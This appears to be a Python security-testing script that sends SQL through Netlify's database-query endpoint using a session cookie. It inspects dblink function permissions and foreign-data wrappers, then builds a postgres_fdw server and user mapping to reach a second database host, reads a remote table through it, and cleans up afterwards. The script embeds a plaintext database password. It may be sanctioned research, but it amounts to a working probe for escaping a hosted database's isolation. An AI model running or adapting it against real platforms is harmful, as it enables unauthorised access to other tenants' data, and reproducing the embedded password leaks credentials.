# -*- coding: utf-8 -*-
"""技术层测试 2:dblink 函数 ACL + postgres_fdw 出站能力
1. proacl 看 dblink 系函数权限
2. postgres_fdw:create server/user mapping/foreign table → 出站连 B(自验网络)
3. 其他 fdw wrapper 清单
清理:drop foreign table/server/user mapping"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'
PWD_B_OWNER = 'npg_TWUSd2Mavu7G'


def q(sql):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=45)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    body = {'siteId': SITE_A, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:2000].decode('utf-8', 'ignore')
    conn.close()
    return st, out


def tx(qs):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=45)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    body = {'siteId': SITE_A, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:1500].decode('utf-8', 'ignore')
    conn.close()
    return st, out


print('== ACL 侦察 ==')
st, out = q("select p.proname, coalesce(p.proacl::text,'(null)') as acl from pg_proc p "
            "join pg_namespace n on p.pronamespace=n.oid where n.nspname='public' "
            "and (p.proname like 'dblink%' or p.proname='repack_trigger') order by 1")
print('[%d] %s' % (st, out[:1800]))
st, out = q("select fdwname, fdwowner::regrole from pg_foreign_data_wrapper")
print('fdw wrappers [%d] %s' % (st, out[:500]))

print()
print('== postgres_fdw 出站测试 ==')
steps = [
    ('create server b', "create server if not exists srv_b foreign data wrapper postgres_fdw options (host 'ep-cold-unit-ae9s4l3i.c-2.us-east-2.db.netlify.com', port '5432', dbname 'netlifydb')"),
    ('user mapping', "create user mapping if not exists for netlifydb_owner server srv_b options (user 'netlifydb_owner', password '%s')" % PWD_B_OWNER),
    ('foreign table', "create foreign table if not exists ft_b(id int) server srv_b options (schema_name 'public', table_name 'k_probe')"),
    ('read via fdw', "select * from ft_b"),
    ('fdw can import', "import foreign schema public limit to (k_probe) from server srv_b into public"),
    ('clean ft', 'drop table if exists ft_b'),
    ('clean um', 'drop user mapping if exists for netlifydb_owner server srv_b'),
    ('clean srv', 'drop server if exists srv_b'),
]
for desc, sql in steps:
    st, out = q(sql)
    print('%-22s [%d] %s' % (desc, st, out[:400]))
